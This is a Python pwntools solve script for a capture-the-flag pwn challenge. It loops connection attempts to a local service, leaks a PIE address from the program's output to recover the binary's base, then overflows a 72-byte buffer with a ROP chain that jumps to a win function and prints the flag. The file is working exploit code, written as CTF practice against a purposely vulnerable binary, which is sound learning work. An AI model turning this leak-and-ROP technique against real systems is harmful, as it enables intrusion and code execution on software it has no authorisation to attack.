from pwn import *
import struct

for x in range(20):
    # io = process('../dist/challenge')
    io = remote('localhost', 1337)
    #context.log_level = 'debug'
    elf = ELF('../dist/challenge')
    context.arch = 'amd64'
    terminal = ['tmux', 'splitw', '-h']

    OFFSET = 72

    name = b'PwningMinionPADDINGGGGG'
    length = b'89'

    io.sendlineafter(b'Enter minion name: \n', name)
    io.sendlineafter(b'Whats the length of your minion: \n', length)

    io.recvuntil(b'(y/n):')
    io.sendline(b'y')

    io.recvline()
    out = io.recvline()

    #? Can fail because of ASLR and null bytes
    try:
        for i in range(0, len(out) - 8, 8):
            val = struct.unpack("<Q", out[i:i+8])[0]
            if 0x500000000000 <= val <= 0x600000000000:
                print(f"[PIE ] {hex(val)}")
                leak = val
                break

        log.success(f"Leaked PIE address: {hex(leak)}")
        elf.address = leak - 0x11e0
        log.success(f"Base address: {hex(elf.address)}")
    except:
        io.close()
        continue

    rop = ROP(elf)
    dream = OFFSET * b'A' + p64(rop.ret.address) + p64(elf.symbols['_'])
    io.recvuntil(b'Whats the dream of the minion:')
    io.sendline(dream)

    out = io.recvall(2)
    if b'CMSTR{' in out:
        print(f"Flag found: {out.decode().split('AA')[0].strip()}")
        break
    io.close()